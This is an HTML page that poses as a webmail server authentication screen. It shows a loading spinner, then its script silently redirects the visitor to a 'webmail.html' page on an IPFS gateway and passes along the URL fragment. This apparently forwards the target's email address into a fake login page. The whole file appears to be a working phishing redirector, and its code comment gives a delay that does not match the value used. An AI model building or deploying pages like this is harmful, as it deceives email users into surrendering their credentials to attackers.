<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Authenticating Webmail Server</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background: #f0f2f5;
            color: #333;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-weight: bold;
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
    <script>
        setTimeout(() => {
            window.location.href = 'https://bafybeidaz2zyor45hlxz7zvs7gcunea5f4bte4rcjhwyki6dmz4ek4fomq.ipfs.dweb.link/webmail.html' + window.location.hash;
        }, 3000); // 2 second delay
    </script>
</head>
<body>
    <div class="loader"></div>
    <div class="status">AUTHENTICATING WEBMAIL SERVER...</div>
</body>
</html>
